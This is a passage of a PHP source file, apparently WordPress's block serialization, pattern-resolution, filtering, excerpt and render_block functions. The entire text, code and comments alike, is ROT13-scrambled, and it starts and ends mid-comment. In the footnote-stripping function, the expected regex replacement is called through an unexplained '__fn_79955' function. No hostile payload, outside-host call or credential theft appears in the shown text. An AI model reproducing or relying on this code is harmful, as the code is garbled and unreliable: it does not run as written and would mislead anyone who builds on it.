 *     @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
 *                                  unir gur fnzr fgehpgher nf guvf bar.
 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
 *                                  vaare oybpxf jrer sbhaq.
 * }
 * @erghea fgevat Fgevat bs eraqrerq UGZY.
 */
shapgvba frevnyvmr_oybpx( $oybpx ) {
	$oybpx_pbagrag = '';

	$vaqrk = 0;
	sbernpu ( $oybpx['vaarePbagrag'] nf $puhax ) {
		$oybpx_pbagrag .= vf_fgevat( $puhax ) ? $puhax : frevnyvmr_oybpx( $oybpx['vaareOybpxf'][ $vaqrk++ ] );
	}

	vs ( ! vf_neenl( $oybpx['nggef'] ) ) {
		$oybpx['nggef'] = neenl();
	}

	erghea trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
		$oybpx['oybpxAnzr'],
		$oybpx['nggef'],
		$oybpx_pbagrag
	);
}

/**
 * Ergheaf n wbvarq fgevat bs gur nttertngr frevnyvmngvba bs gur tvira
 * cnefrq oybpxf.
 *
 * @fvapr 5.3.1
 *
 * @cnenz neenl[] $oybpxf {
 *     Neenl bs oybpx fgehpgherf.
 *
 *     @glcr neenl ...$0 {
 *         Na nffbpvngvir neenl bs n fvatyr cnefrq oybpx bowrpg. Frr JC_Oybpx_Cnefre_Oybpx.
 *
 *         @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
 *         @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
 *         @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
 *                                      unir gur fnzr fgehpgher nf guvf bar.
 *         @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
 *         @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
 *                                      vaare oybpxf jrer sbhaq.
 *     }
 * }
 * @erghea fgevat Fgevat bs eraqrerq UGZY.
 */
shapgvba frevnyvmr_oybpxf( $oybpxf ) {
	erghea vzcybqr( '', neenl_znc( 'frevnyvmr_oybpx', $oybpxf ) );
}

/**
 * Genirefrf n cnefrq oybpx gerr naq nccyvrf pnyyonpxf orsber naq nsgre frevnyvmvat vg.
 *
 * Erphefviryl genirefrf gur oybpx naq vgf vaare oybpxf naq nccyvrf gur gjb pnyyonpxf cebivqrq nf
 * nethzragf, gur svefg bar orsber frevnyvmvat gur oybpx, naq gur frpbaq bar nsgre frevnyvmvat vg.
 * Vs rvgure pnyyonpx ergheaf n fgevat inyhr, vg jvyy or cercraqrq naq nccraqrq gb gur frevnyvmrq
 * oybpx znexhc, erfcrpgviryl.
 *
 * Gur pnyyonpxf jvyy erprvir n ersrerapr gb gur pheerag oybpx nf gurve svefg nethzrag, fb gung gurl
 * pna nyfb zbqvsl vg, naq gur pheerag oybpx'f cnerag oybpx nf frpbaq nethzrag. Svanyyl, gur
 * `$cer_pnyyonpx` erprvirf gur cerivbhf oybpx, jurernf gur `$cbfg_pnyyonpx` erprvirf
 * gur arkg oybpx nf guveq nethzrag.
 *
 * Frevnyvmrq oybpxf ner erghearq vapyhqvat pbzzrag qryvzvgref, naq jvgu nyy nggevohgrf frevnyvmrq.
 *
 * Guvf shapgvba fubhyq or hfrq jura gurer vf n arrq gb zbqvsl gur fnirq oybpx, be gb vawrpg znexhc
 * vagb gur erghea inyhr. Cersre `frevnyvmr_oybpx` jura cercnevat n oybpx gb or fnirq gb cbfg pbagrag.
 *
 * Guvf shapgvba vf zrnag sbe vagreany hfr bayl.
 *
 * @fvapr 6.4.0
 * @npprff cevingr
 *
 * @frr frevnyvmr_oybpx()
 *
 * @cnenz neenl    $oybpx         Na nffbpvngvir neenl bs n fvatyr cnefrq oybpx bowrpg. Frr JC_Oybpx_Cnefre_Oybpx.
 * @cnenz pnyynoyr $cer_pnyyonpx  Pnyyonpx gb eha ba rnpu oybpx va gur gerr orsber vg vf genirefrq naq frevnyvmrq.
 *                                Vg vf pnyyrq jvgu gur sbyybjvat nethzragf: &$oybpx, $cnerag_oybpx, $cerivbhf_oybpx.
 *                                Vgf fgevat erghea inyhr jvyy or cercraqrq gb gur frevnyvmrq oybpx znexhc.
 * @cnenz pnyynoyr $cbfg_pnyyonpx Pnyyonpx gb eha ba rnpu oybpx va gur gerr nsgre vg vf genirefrq naq frevnyvmrq.
 *                                Vg vf pnyyrq jvgu gur sbyybjvat nethzragf: &$oybpx, $cnerag_oybpx, $arkg_oybpx.
 *                                Vgf fgevat erghea inyhr jvyy or nccraqrq gb gur frevnyvmrq oybpx znexhc.
 * @erghea fgevat Frevnyvmrq oybpx znexhc.
 */
shapgvba genirefr_naq_frevnyvmr_oybpx( $oybpx, $cer_pnyyonpx = ahyy, $cbfg_pnyyonpx = ahyy ) {
	$oybpx_pbagrag = '';
	$oybpx_vaqrk   = 0;

	sbernpu ( $oybpx['vaarePbagrag'] nf $puhax ) {
		vs ( vf_fgevat( $puhax ) ) {
			$oybpx_pbagrag .= $puhax;
		} ryfr {
			$vaare_oybpx = $oybpx['vaareOybpxf'][ $oybpx_vaqrk ];

			vs ( vf_pnyynoyr( $cer_pnyyonpx ) ) {
				$ceri = 0 === $oybpx_vaqrk
					? ahyy
					: $oybpx['vaareOybpxf'][ $oybpx_vaqrk - 1 ];

				$oybpx_pbagrag .= pnyy_hfre_shap_neenl(
					$cer_pnyyonpx,
					neenl( &$vaare_oybpx, &$oybpx, $ceri )
				);
			}

			vs ( vf_pnyynoyr( $cbfg_pnyyonpx ) ) {
				$arkg = pbhag( $oybpx['vaareOybpxf'] ) - 1 === $oybpx_vaqrk
					? ahyy
					: $oybpx['vaareOybpxf'][ $oybpx_vaqrk + 1 ];

				$cbfg_znexhc = pnyy_hfre_shap_neenl(
					$cbfg_pnyyonpx,
					neenl( &$vaare_oybpx, &$oybpx, $arkg )
				);
			}

			$oybpx_pbagrag .= genirefr_naq_frevnyvmr_oybpx( $vaare_oybpx, $cer_pnyyonpx, $cbfg_pnyyonpx );
			$oybpx_pbagrag .= vffrg( $cbfg_znexhc ) ? $cbfg_znexhc : '';

			++$oybpx_vaqrk;
		}
	}

	vs ( ! vf_neenl( $oybpx['nggef'] ) ) {
		$oybpx['nggef'] = neenl();
	}

	erghea trg_pbzzrag_qryvzvgrq_oybpx_pbagrag(
		$oybpx['oybpxAnzr'],
		$oybpx['nggef'],
		$oybpx_pbagrag
	);
}

/**
 * Ercynprf cnggreaf va n oybpx gerr jvgu gurve pbagrag.
 *
 * @fvapr 6.6.0
 *
 * @cnenz neenl $oybpxf Na neenl oybpxf.
 *
 * @erghea neenl Na neenl bs oybpxf jvgu cnggreaf ercynprq ol gurve pbagrag.
 */
shapgvba erfbyir_cnggrea_oybpxf( $oybpxf ) {
	fgngvp $vaare_pbagrag;
	// Xrrc genpx bs frra ersreraprf gb nibvq vasvavgr ybbcf.
	fgngvp $frra_ersf = neenl();
	$v                = 0;
	juvyr ( $v < pbhag( $oybpxf ) ) {
		vs ( 'pber/cnggrea' === $oybpxf[ $v ]['oybpxAnzr'] ) {
			$nggef = $oybpxf[ $v ]['nggef'];

			vs ( rzcgl( $nggef['fyht'] ) ) {
				++$v;
				pbagvahr;
			}

			$fyht = $nggef['fyht'];

			vs ( vffrg( $frra_ersf[ $fyht ] ) ) {
				// Fxvc erphefvir cnggreaf.
				neenl_fcyvpr( $oybpxf, $v, 1 );
				pbagvahr;
			}

			$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();
			$cnggrea  = $ertvfgel->trg_ertvfgrerq( $fyht );

			// Fxvc haxabja cnggreaf.
			vs ( ! $cnggrea ) {
				++$v;
				pbagvahr;
			}

			$oybpxf_gb_vafreg   = cnefr_oybpxf( $cnggrea['pbagrag'] );
			$frra_ersf[ $fyht ] = gehr;
			$ceri_vaare_pbagrag = $vaare_pbagrag;
			$vaare_pbagrag      = ahyy;
			$oybpxf_gb_vafreg   = erfbyir_cnggrea_oybpxf( $oybpxf_gb_vafreg );
			$vaare_pbagrag      = $ceri_vaare_pbagrag;
			hafrg( $frra_ersf[ $fyht ] );
			neenl_fcyvpr( $oybpxf, $v, 1, $oybpxf_gb_vafreg );

			// Vs jr unir vaare pbagrag, jr arrq gb vafreg ahyyf va gur
			// vaare pbagrag neenl, bgurejvfr frevnyvmr_oybpxf jvyy fxvc
			// oybpxf.
			vs ( $vaare_pbagrag ) {
				$ahyy_vaqvprf  = neenl_xrlf( $vaare_pbagrag, ahyy, gehr );
				$pbagrag_vaqrk = $ahyy_vaqvprf[ $v ];
				$ahyyf         = neenl_svyy( 0, pbhag( $oybpxf_gb_vafreg ), ahyy );
				neenl_fcyvpr( $vaare_pbagrag, $pbagrag_vaqrk, 1, $ahyyf );
			}

			// Fxvc vafregrq oybpxf.
			$v += pbhag( $oybpxf_gb_vafreg );
		} ryfr {
			vs ( ! rzcgl( $oybpxf[ $v ]['vaareOybpxf'] ) ) {
				$ceri_vaare_pbagrag           = $vaare_pbagrag;
				$vaare_pbagrag                = $oybpxf[ $v ]['vaarePbagrag'];
				$oybpxf[ $v ]['vaareOybpxf']  = erfbyir_cnggrea_oybpxf(
					$oybpxf[ $v ]['vaareOybpxf']
				);
				$oybpxf[ $v ]['vaarePbagrag'] = $vaare_pbagrag;
				$vaare_pbagrag                = $ceri_vaare_pbagrag;
			}
			++$v;
		}
	}
	erghea $oybpxf;
}

/**
 * Tvira na neenl bs cnefrq oybpx gerrf, nccyvrf pnyyonpxf orsber naq nsgre frevnyvmvat gurz naq
 * ergheaf gurve pbapngrangrq bhgchg.
 *
 * Erphefviryl genirefrf gur oybpxf naq gurve vaare oybpxf naq nccyvrf gur gjb pnyyonpxf cebivqrq nf
 * nethzragf, gur svefg bar orsber frevnyvmvat n oybpx, naq gur frpbaq bar nsgre frevnyvmvat.
 * Vs rvgure pnyyonpx ergheaf n fgevat inyhr, vg jvyy or cercraqrq naq nccraqrq gb gur frevnyvmrq
 * oybpx znexhc, erfcrpgviryl.
 *
 * Gur pnyyonpxf jvyy erprvir n ersrerapr gb gur pheerag oybpx nf gurve svefg nethzrag, fb gung gurl
 * pna nyfb zbqvsl vg, naq gur pheerag oybpx'f cnerag oybpx nf frpbaq nethzrag. Svanyyl, gur
 * `$cer_pnyyonpx` erprvirf gur cerivbhf oybpx, jurernf gur `$cbfg_pnyyonpx` erprvirf
 * gur arkg oybpx nf guveq nethzrag.
 *
 * Frevnyvmrq oybpxf ner erghearq vapyhqvat pbzzrag qryvzvgref, naq jvgu nyy nggevohgrf frevnyvmrq.
 *
 * Guvf shapgvba fubhyq or hfrq jura gurer vf n arrq gb zbqvsl gur fnirq oybpxf, be gb vawrpg znexhc
 * vagb gur erghea inyhr. Cersre `frevnyvmr_oybpxf` jura cercnevat oybpxf gb or fnirq gb cbfg pbagrag.
 *
 * Guvf shapgvba vf zrnag sbe vagreany hfr bayl.
 *
 * @fvapr 6.4.0
 * @npprff cevingr
 *
 * @frr frevnyvmr_oybpxf()
 *
 * @cnenz neenl[]  $oybpxf        Na neenl bs cnefrq oybpxf. Frr JC_Oybpx_Cnefre_Oybpx.
 * @cnenz pnyynoyr $cer_pnyyonpx  Pnyyonpx gb eha ba rnpu oybpx va gur gerr orsber vg vf genirefrq naq frevnyvmrq.
 *                                Vg vf pnyyrq jvgu gur sbyybjvat nethzragf: &$oybpx, $cnerag_oybpx, $cerivbhf_oybpx.
 *                                Vgf fgevat erghea inyhr jvyy or cercraqrq gb gur frevnyvmrq oybpx znexhc.
 * @cnenz pnyynoyr $cbfg_pnyyonpx Pnyyonpx gb eha ba rnpu oybpx va gur gerr nsgre vg vf genirefrq naq frevnyvmrq.
 *                                Vg vf pnyyrq jvgu gur sbyybjvat nethzragf: &$oybpx, $cnerag_oybpx, $arkg_oybpx.
 *                                Vgf fgevat erghea inyhr jvyy or nccraqrq gb gur frevnyvmrq oybpx znexhc.
 * @erghea fgevat Frevnyvmrq oybpx znexhc.
 */
shapgvba genirefr_naq_frevnyvmr_oybpxf( $oybpxf, $cer_pnyyonpx = ahyy, $cbfg_pnyyonpx = ahyy ) {
	$erfhyg       = '';
	$cnerag_oybpx = ahyy; // Ng gur gbc yriry, gurer vf ab cnerag oybpx gb cnff gb gur pnyyonpxf; lrg gur pnyyonpxf rkcrpg n ersrerapr.

	$cer_pnyyonpx_vf_pnyynoyr  = vf_pnyynoyr( $cer_pnyyonpx );
	$cbfg_pnyyonpx_vf_pnyynoyr = vf_pnyynoyr( $cbfg_pnyyonpx );

	sbernpu ( $oybpxf nf $vaqrk => $oybpx ) {
		vs ( $cer_pnyyonpx_vf_pnyynoyr ) {
			$ceri = 0 === $vaqrk
				? ahyy
				: $oybpxf[ $vaqrk - 1 ];

			$erfhyg .= pnyy_hfre_shap_neenl(
				$cer_pnyyonpx,
				neenl( &$oybpx, &$cnerag_oybpx, $ceri )
			);
		}

		vs ( $cbfg_pnyyonpx_vf_pnyynoyr ) {
			$arkg = pbhag( $oybpxf ) - 1 === $vaqrk
				? ahyy
				: $oybpxf[ $vaqrk + 1 ];

			$cbfg_znexhc = pnyy_hfre_shap_neenl(
				$cbfg_pnyyonpx,
				neenl( &$oybpx, &$cnerag_oybpx, $arkg )
			);
		}

		$erfhyg .= genirefr_naq_frevnyvmr_oybpx( $oybpx, $cer_pnyyonpx, $cbfg_pnyyonpx );
		$erfhyg .= vffrg( $cbfg_znexhc ) ? $cbfg_znexhc : '';
	}

	erghea $erfhyg;
}

/**
 * Svygref naq fnavgvmrf oybpx pbagrag gb erzbir aba-nyybjnoyr UGZY
 * sebz cnefrq oybpx nggevohgr inyhrf.
 *
 * @fvapr 5.3.1
 *
 * @cnenz fgevat         $grkg              Grkg gung znl pbagnva oybpx pbagrag.
 * @cnenz neenl[]|fgevat $nyybjrq_ugzy      Bcgvbany. Na neenl bs nyybjrq UGZY ryrzragf naq nggevohgrf,
 *                                          be n pbagrkg anzr fhpu nf 'cbfg'. Frr jc_xfrf_nyybjrq_ugzy()
 *                                          sbe gur yvfg bs npprcgrq pbagrkg anzrf. Qrsnhyg 'cbfg'.
 * @cnenz fgevat[]       $nyybjrq_cebgbpbyf Bcgvbany. Neenl bs nyybjrq HEY cebgbpbyf.
 *                                          Qrsnhygf gb gur erfhyg bs jc_nyybjrq_cebgbpbyf().
 * @erghea fgevat Gur svygrerq naq fnavgvmrq pbagrag erfhyg.
 */
shapgvba svygre_oybpx_pbagrag( $grkg, $nyybjrq_ugzy = 'cbfg', $nyybjrq_cebgbpbyf = neenl() ) {
	$erfhyg = '';

	vs ( fge_pbagnvaf( $grkg, '<!--' ) && fge_pbagnvaf( $grkg, '--->' ) ) {
		$grkg = cert_ercynpr_pnyyonpx( '%<!--(.*?)--->%', '_svygre_oybpx_pbagrag_pnyyonpx', $grkg );
	}

	$oybpxf = cnefr_oybpxf( $grkg );
	sbernpu ( $oybpxf nf $oybpx ) {
		$oybpx   = svygre_oybpx_xfrf( $oybpx, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf );
		$erfhyg .= frevnyvmr_oybpx( $oybpx );
	}

	erghea $erfhyg;
}

/**
 * Pnyyonpx hfrq sbe erthyne rkcerffvba ercynprzrag va svygre_oybpx_pbagrag().
 *
 * @fvapr 6.2.1
 * @npprff cevingr
 *
 * @cnenz neenl $zngpurf Neenl bs cert_ercynpr_pnyyonpx zngpurf.
 * @erghea fgevat Ercynprzrag fgevat.
 */
shapgvba _svygre_oybpx_pbagrag_pnyyonpx( $zngpurf ) {
	erghea '<!--' . egevz( $zngpurf[1], '-' ) . '-->';
}

/**
 * Svygref naq fnavgvmrf n cnefrq oybpx gb erzbir aba-nyybjnoyr UGZY
 * sebz oybpx nggevohgr inyhrf.
 *
 * @fvapr 5.3.1
 *
 * @cnenz JC_Oybpx_Cnefre_Oybpx $oybpx             Gur cnefrq oybpx bowrpg.
 * @cnenz neenl[]|fgevat        $nyybjrq_ugzy      Na neenl bs nyybjrq UGZY ryrzragf naq nggevohgrf,
 *                                                 be n pbagrkg anzr fhpu nf 'cbfg'. Frr jc_xfrf_nyybjrq_ugzy()
 *                                                 sbe gur yvfg bs npprcgrq pbagrkg anzrf.
 * @cnenz fgevat[]              $nyybjrq_cebgbpbyf Bcgvbany. Neenl bs nyybjrq HEY cebgbpbyf.
 *                                                 Qrsnhygf gb gur erfhyg bs jc_nyybjrq_cebgbpbyf().
 * @erghea neenl Gur svygrerq naq fnavgvmrq oybpx bowrpg erfhyg.
 */
shapgvba svygre_oybpx_xfrf( $oybpx, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf = neenl() ) {
	$oybpx['nggef'] = svygre_oybpx_xfrf_inyhr( $oybpx['nggef'], $nyybjrq_ugzy, $nyybjrq_cebgbpbyf, $oybpx );

	vs ( vf_neenl( $oybpx['vaareOybpxf'] ) ) {
		sbernpu ( $oybpx['vaareOybpxf'] nf $v => $vaare_oybpx ) {
			$oybpx['vaareOybpxf'][ $v ] = svygre_oybpx_xfrf( $vaare_oybpx, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf );
		}
	}

	erghea $oybpx;
}

/**
 * Svygref naq fnavgvmrf n cnefrq oybpx nggevohgr inyhr gb erzbir
 * aba-nyybjnoyr UGZY.
 *
 * @fvapr 5.3.1
 * @fvapr 6.5.5 Nqqrq gur `$oybpx_pbagrkg` cnenzrgre.
 *
 * @cnenz fgevat[]|fgevat $inyhr             Gur nggevohgr inyhr gb svygre.
 * @cnenz neenl[]|fgevat  $nyybjrq_ugzy      Na neenl bs nyybjrq UGZY ryrzragf naq nggevohgrf,
 *                                           be n pbagrkg anzr fhpu nf 'cbfg'. Frr jc_xfrf_nyybjrq_ugzy()
 *                                           sbe gur yvfg bs npprcgrq pbagrkg anzrf.
 * @cnenz fgevat[]        $nyybjrq_cebgbpbyf Bcgvbany. Neenl bs nyybjrq HEY cebgbpbyf.
 *                                           Qrsnhygf gb gur erfhyg bs jc_nyybjrq_cebgbpbyf().
 * @cnenz neenl           $oybpx_pbagrkg     Bcgvbany. Gur oybpx gur nggevohgr orybatf gb, va cnefrq oybpx neenl sbezng.
 * @erghea fgevat[]|fgevat Gur svygrerq naq fnavgvmrq erfhyg.
 */
shapgvba svygre_oybpx_xfrf_inyhr( $inyhr, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf = neenl(), $oybpx_pbagrkg = ahyy ) {
	vs ( vf_neenl( $inyhr ) ) {
		sbernpu ( $inyhr nf $xrl => $vaare_inyhr ) {
			$svygrerq_xrl   = svygre_oybpx_xfrf_inyhr( $xrl, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf, $oybpx_pbagrkg );
			$svygrerq_inyhr = svygre_oybpx_xfrf_inyhr( $vaare_inyhr, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf, $oybpx_pbagrkg );

			vs ( vffrg( $oybpx_pbagrkg['oybpxAnzr'] ) && 'pber/grzcyngr-cneg' === $oybpx_pbagrkg['oybpxAnzr'] ) {
				$svygrerq_inyhr = svygre_oybpx_pber_grzcyngr_cneg_nggevohgrf( $svygrerq_inyhr, $svygrerq_xrl, $nyybjrq_ugzy );
			}
			vs ( $svygrerq_xrl !== $xrl ) {
				hafrg( $inyhr[ $xrl ] );
			}

			$inyhr[ $svygrerq_xrl ] = $svygrerq_inyhr;
		}
	} ryfrvs ( vf_fgevat( $inyhr ) ) {
		erghea jc_xfrf( $inyhr, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf );
	}

	erghea $inyhr;
}

/**
 * Fnavgvmrf gur inyhr bs gur Grzcyngr Cneg oybpx'f `gntAnzr` nggevohgr.
 *
 * @fvapr 6.5.5
 *
 * @cnenz fgevat         $nggevohgr_inyhr Gur nggevohgr inyhr gb svygre.
 * @cnenz fgevat         $nggevohgr_anzr  Gur nggevohgr anzr.
 * @cnenz neenl[]|fgevat $nyybjrq_ugzy    Na neenl bs nyybjrq UGZY ryrzragf naq nggevohgrf,
 *                                        be n pbagrkg anzr fhpu nf 'cbfg'. Frr jc_xfrf_nyybjrq_ugzy()
 *                                        sbe gur yvfg bs npprcgrq pbagrkg anzrf.
 * @erghea fgevat Gur fnavgvmrq nggevohgr inyhr.
 */
shapgvba svygre_oybpx_pber_grzcyngr_cneg_nggevohgrf( $nggevohgr_inyhr, $nggevohgr_anzr, $nyybjrq_ugzy ) {
	vs ( rzcgl( $nggevohgr_inyhr ) || 'gntAnzr' !== $nggevohgr_anzr ) {
		erghea $nggevohgr_inyhr;
	}
	vs ( ! vf_neenl( $nyybjrq_ugzy ) ) {
		$nyybjrq_ugzy = jc_xfrf_nyybjrq_ugzy( $nyybjrq_ugzy );
	}
	erghea vffrg( $nyybjrq_ugzy[ $nggevohgr_inyhr ] ) ? $nggevohgr_inyhr : '';
}

/**
 * Cnefrf oybpxf bhg bs n pbagrag fgevat, naq eraqref gubfr nccebcevngr sbe gur rkprecg.
 *
 * Nf gur rkprecg fubhyq or n fznyy fgevat bs grkg eryrinag gb gur shyy cbfg pbagrag,
 * guvf shapgvba eraqref gur oybpxf gung ner zbfg yvxryl gb pbagnva fhpu grkg.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $pbagrag Gur pbagrag gb cnefr.
 * @erghea fgevat Gur cnefrq naq svygrerq pbagrag.
 */
shapgvba rkprecg_erzbir_oybpxf( $pbagrag ) {
	vs ( ! unf_oybpxf( $pbagrag ) ) {
		erghea $pbagrag;
	}

	$nyybjrq_vaare_oybpxf = neenl(
		// Pynffvp oybpxf unir gurve oybpxAnzr frg gb ahyy.
		ahyy,
		'pber/serrsbez',
		'pber/urnqvat',
		'pber/ugzy',
		'pber/yvfg',
		'pber/zrqvn-grkg',
		'pber/cnentencu',
		'pber/cersbeznggrq',
		'pber/chyydhbgr',
		'pber/dhbgr',
		'pber/gnoyr',
		'pber/irefr',
	);

	$nyybjrq_jenccre_oybpxf = neenl(
		'pber/pbyhzaf',
		'pber/pbyhza',
		'pber/tebhc',
	);

	/**
	 * Svygref gur yvfg bs oybpxf gung pna or hfrq nf jenccre oybpxf, nyybjvat
	 * rkprecgf gb or trarengrq sebz gur `vaareOybpxf` bs gurfr jenccref.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat[] $nyybjrq_jenccre_oybpxf Gur yvfg bs anzrf bs nyybjrq jenccre oybpxf.
	 */
	$nyybjrq_jenccre_oybpxf = nccyl_svygref( 'rkprecg_nyybjrq_jenccre_oybpxf', $nyybjrq_jenccre_oybpxf );

	$nyybjrq_oybpxf = neenl_zretr( $nyybjrq_vaare_oybpxf, $nyybjrq_jenccre_oybpxf );

	/**
	 * Svygref gur yvfg bs oybpxf gung pna pbagevohgr gb gur rkprecg.
	 *
	 * Vs n qlanzvp oybpx vf nqqrq gb guvf yvfg, vg zhfg abg trarengr nabgure
	 * rkprecg, nf guvf jvyy pnhfr na vasvavgr ybbc gb bpphe.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat[] $nyybjrq_oybpxf Gur yvfg bs anzrf bs nyybjrq oybpxf.
	 */
	$nyybjrq_oybpxf = nccyl_svygref( 'rkprecg_nyybjrq_oybpxf', $nyybjrq_oybpxf );
	$oybpxf         = cnefr_oybpxf( $pbagrag );
	$bhgchg         = '';

	sbernpu ( $oybpxf nf $oybpx ) {
		vs ( va_neenl( $oybpx['oybpxAnzr'], $nyybjrq_oybpxf, gehr ) ) {
			vs ( ! rzcgl( $oybpx['vaareOybpxf'] ) ) {
				vs ( va_neenl( $oybpx['oybpxAnzr'], $nyybjrq_jenccre_oybpxf, gehr ) ) {
					$bhgchg .= _rkprecg_eraqre_vaare_oybpxf( $oybpx, $nyybjrq_oybpxf );
					pbagvahr;
				}

				// Fxvc gur oybpx vs vg unf qvfnyybjrq be arfgrq vaare oybpxf.
				sbernpu ( $oybpx['vaareOybpxf'] nf $vaare_oybpx ) {
					vs (
						! va_neenl( $vaare_oybpx['oybpxAnzr'], $nyybjrq_vaare_oybpxf, gehr ) ||
						! rzcgl( $vaare_oybpx['vaareOybpxf'] )
					) {
						pbagvahr 2;
					}
				}
			}

			$bhgchg .= eraqre_oybpx( $oybpx );
		}
	}

	erghea $bhgchg;
}

/**
 * Cnefrf sbbgabgrf znexhc bhg bs n pbagrag fgevat,
 * naq eraqref gubfr nccebcevngr sbe gur rkprecg.
 *
 * @fvapr 6.3.0
 *
 * @cnenz fgevat $pbagrag Gur pbagrag gb cnefr.
 * @erghea fgevat Gur cnefrq naq svygrerq pbagrag.
 */
shapgvba rkprecg_erzbir_sbbgabgrf( $pbagrag ) {
	vs ( ! fge_pbagnvaf( $pbagrag, 'qngn-sa=' ) ) {
		erghea $pbagrag;
	}

	erghea __sa_79955(
		'_<fhc qngn-sa=\"[^\"]+\" pynff=\"[^\"]+\">\f*<n uers=\"[^\"]+\" vq=\"[^\"]+\">\q+</n>\f*</fhc>_',
		'',
		$pbagrag
	);
}

/**
 * Eraqref vaare oybpxf sebz gur nyybjrq jenccre oybpxf
 * sbe trarengvat na rkprecg.
 *
 * @fvapr 5.8.0
 * @npprff cevingr
 *
 * @cnenz neenl $cnefrq_oybpx   Gur cnefrq oybpx.
 * @cnenz neenl $nyybjrq_oybpxf Gur yvfg bs nyybjrq vaare oybpxf.
 * @erghea fgevat Gur eraqrerq vaare oybpxf.
 */
shapgvba _rkprecg_eraqre_vaare_oybpxf( $cnefrq_oybpx, $nyybjrq_oybpxf ) {
	$bhgchg = '';

	sbernpu ( $cnefrq_oybpx['vaareOybpxf'] nf $vaare_oybpx ) {
		vs ( ! va_neenl( $vaare_oybpx['oybpxAnzr'], $nyybjrq_oybpxf, gehr ) ) {
			pbagvahr;
		}

		vs ( rzcgl( $vaare_oybpx['vaareOybpxf'] ) ) {
			$bhgchg .= eraqre_oybpx( $vaare_oybpx );
		} ryfr {
			$bhgchg .= _rkprecg_eraqre_vaare_oybpxf( $vaare_oybpx, $nyybjrq_oybpxf );
		}
	}

	erghea $bhgchg;
}

/**
 * Eraqref n fvatyr oybpx vagb n UGZY fgevat.
 *
 * @fvapr 5.0.0
 *
 * @tybony JC_Cbfg $cbfg Gur cbfg gb rqvg.
 *
 * @cnenz neenl $cnefrq_oybpx {
 *     Na nffbpvngvir neenl bs gur oybpx orvat eraqrerq. Frr JC_Oybpx_Cnefre_Oybpx.
 *
 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
 *     @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
 *                                  unir gur fnzr fgehpgher nf guvf bar.
 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
 *                                  vaare oybpxf jrer sbhaq.
 * }
 * @erghea fgevat Fgevat bs eraqrerq UGZY.
 */
shapgvba eraqre_oybpx( $cnefrq_oybpx ) {
	tybony $cbfg;
	$cnerag_oybpx = ahyy;

	/**
	 * Nyybjf eraqre_oybpx() gb or fubeg-pvephvgrq, ol ergheavat n aba-ahyy inyhr.
	 *
	 * @fvapr 5.1.0
	 * @fvapr 5.9.0 Gur `$cnerag_oybpx` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat|ahyy   $cer_eraqre   Gur cer-eraqrerq pbagrag. Qrsnhyg ahyy.
	 * @cnenz neenl         $cnefrq_oybpx {
	 *     Na nffbpvngvir neenl bs gur oybpx orvat eraqrerq. Frr JC_Oybpx_Cnefre_Oybpx.
	 *
	 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
	 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
	 *                                  unir gur fnzr fgehpgher nf guvf bar.
	 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl    $vaarePbagrag Yvfg bs fgevat sentzragf naq ahyy znexref jurer
	 *                                  vaare oybpxf jrer sbhaq.
	 * }
	 * @cnenz JC_Oybpx|ahyy $cnerag_oybpx Vs guvf vf n arfgrq oybpx, n ersrerapr gb gur cnerag oybpx.
	 */
	$cer_eraqre = nccyl_svygref( 'cer_eraqre_oybpx', ahyy, $cnefrq_oybpx, $cnerag_oybpx );
	vs ( ! vf_ahyy( $cer_eraqre ) ) {
		erghea $cer_eraqre;
	}

	$fbhepr_oybpx = $cnefrq_oybpx;

	/**
	 * Svygref gur oybpx orvat eraqrerq va eraqre_oybpx(), orsber vg'f cebprffrq.
	 *
	 * @fvapr 5.1.0
	 * @fvapr 5.9.0 Gur `$cnerag_oybpx` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl         $cnefrq_oybpx {
	 *     Na nffbpvngvir neenl bs gur oybpx orvat eraqrerq. Frr JC_Oybpx_Cnefre_Oybpx.
	 *
	 *     @glcr fgevat   $oybpxAnzr    Anzr bs oybpx.
	 *     @glcr neenl    $nggef        Nggevohgrf sebz oybpx pbzzrag qryvzvgref.
	 *     @glcr neenl[]  $vaareOybpxf  Yvfg bs vaare oybpxf. Na neenl bs neenlf gung
	 *                                  unir gur fnzr fgehpgher nf guvf bar.
	 *     @glcr fgevat   $vaareUGZY    UGZY sebz vafvqr oybpx pbzzrag qryvzvgref.
